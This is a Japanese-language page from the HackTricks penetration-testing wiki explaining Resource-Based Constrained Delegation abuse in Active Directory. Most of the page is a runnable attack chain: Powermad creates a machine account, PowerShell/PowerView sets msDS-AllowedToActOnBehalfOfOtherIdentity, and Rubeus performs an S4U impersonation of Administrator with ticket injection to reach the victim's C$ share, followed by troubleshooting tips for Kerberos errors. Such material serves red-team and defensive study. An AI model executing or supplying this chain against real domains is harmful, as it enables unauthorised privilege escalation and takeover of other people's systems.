# リソースベースの制約付き委任

{{#include ../../banners/hacktricks-training.md}}

## リソースベースの制約付き委任の基本

これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**サービスに対して任意のユーザーを偽装するための** **オブジェクト**に権限を与えるのではなく、リソースベースの制約付き委任は、**そのオブジェクトに対して任意のユーザーを偽装できる人を設定します**。

この場合、制約付きオブジェクトには、任意の他のユーザーを偽装できるユーザーの名前を持つ属性 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ が存在します。

この制約付き委任と他の委任との重要な違いは、**マシンアカウントに対する書き込み権限** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) を持つ任意のユーザーが _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できることです（他の委任の形式ではドメイン管理者の特権が必要でした）。

### 新しい概念

制約付き委任では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要であると述べられていました。しかし、それは完全に真実ではありません。\
実際には、その値がなくても、**サービス**（SPNを持つ）であれば任意のユーザーに対して **S4U2Self** を実行できますが、**`TrustedToAuthForDelegation`** を持っている場合、返される TGS は **Forwardable** になります。もしそのフラグを持っていない場合、返される TGS は **Forwardable** ではありません。

ただし、**S4U2Proxy** で使用される **TGS** が **Forwardable でない**場合、基本的な制約付き委任を悪用しようとしても **機能しません**。しかし、リソースベースの制約付き委任を悪用しようとしている場合は、**機能します**（これは脆弱性ではなく、機能のようです）。

### 攻撃構造

> **コンピュータ**アカウントに対して **書き込み同等の権限**を持っている場合、そのマシンで **特権アクセス**を取得できます。

攻撃者がすでに **被害者コンピュータに対する書き込み同等の権限**を持っていると仮定します。

1. 攻撃者は **SPN** を持つアカウントを **侵害**するか、**作成します**（“Service A”）。特に、**特別な権限を持たない** _Admin User_ は最大10個の **コンピュータオブジェクト**（_**MachineAccountQuota**_）を **作成**し、それに **SPN** を設定できます。したがって、攻撃者はコンピュータオブジェクトを作成し、SPNを設定することができます。
2. 攻撃者は被害者コンピュータ（ServiceB）に対する **書き込み権限**を悪用して、**リソースベースの制約付き委任を構成し、ServiceAがその被害者コンピュータ（ServiceB）に対して任意のユーザーを偽装できるようにします**。
3. 攻撃者は Rubeus を使用して、**特権アクセスを持つユーザー**のために Service A から Service B への **完全な S4U 攻撃**（S4U2Self と S4U2Proxy）を実行します。
   1. S4U2Self（侵害または作成されたアカウントの SPN から）：**私に対する Administrator の TGS を要求します**（Forwardable ではありません）。
   2. S4U2Proxy：前のステップの **Forwardable でない TGS** を使用して、**被害者ホスト**に対する **Administrator** の **TGS** を要求します。
   3. Forwardable でない TGS を使用している場合でも、リソースベースの制約付き委任を悪用しているため、**機能します**。
   4. 攻撃者は **パス・ザ・チケット**を行い、ユーザーを **偽装して被害者 ServiceB へのアクセスを得る**ことができます。

ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用できます：
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

[powermad](https://github.com/Kevin-Robertson/Powermad)を使用して、ドメイン内にコンピュータオブジェクトを作成できます。**：**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegationの設定**

**activedirectory PowerShellモジュールを使用**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerViewの使用**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全なS4U攻撃の実行

まず最初に、パスワード`123456`で新しいコンピュータオブジェクトを作成したので、そのパスワードのハッシュが必要です:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
このコマンドは、そのアカウントのRC4およびAESハッシュを出力します。\
次に、攻撃を実行できます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeusの`/altservice`パラメータを使用して、一度のリクエストでより多くのチケットを生成できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには「**Cannot be delegated**」という属性があります。この属性がTrueの場合、そのユーザーを偽装することはできません。このプロパティはbloodhound内で確認できます。

### アクセス

最後のコマンドラインは、**完全なS4U攻撃を実行し、管理者から被害者ホストにTGSを**メモリ内に注入します。\
この例では、管理者から**CIFS**サービスのTGSが要求されたため、**C$**にアクセスできるようになります。
```bash
ls \\victim.domain.local\C$
```
### サービスチケットの悪用

[**利用可能なサービスチケットについてはこちら**](silver-ticket.md#available-services)を学びます。

## Kerberosエラー

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberosがDESまたはRC4を使用しないように構成されており、RC4ハッシュのみを提供していることを意味します。Rubeusに少なくともAES256ハッシュ（またはrc4、aes128、aes256ハッシュを提供してください）を供給してください。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時間がDCの時間と異なり、kerberosが正しく機能していないことを意味します。
- **`preauth_failed`**: これは、指定されたユーザー名 + ハッシュがログインに機能していないことを意味します。ハッシュを生成する際にユーザー名の中に"$"を入れるのを忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります：
  - あなたが偽装しようとしているユーザーが、希望するサービスにアクセスできない（偽装できないか、十分な権限がないため）
  - 要求されたサービスが存在しない（winrmのチケットを要求したが、winrmが実行されていない場合）
  - 作成されたfakecomputerが脆弱なサーバーに対する権限を失っており、それを戻す必要がある。

## 参考文献

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
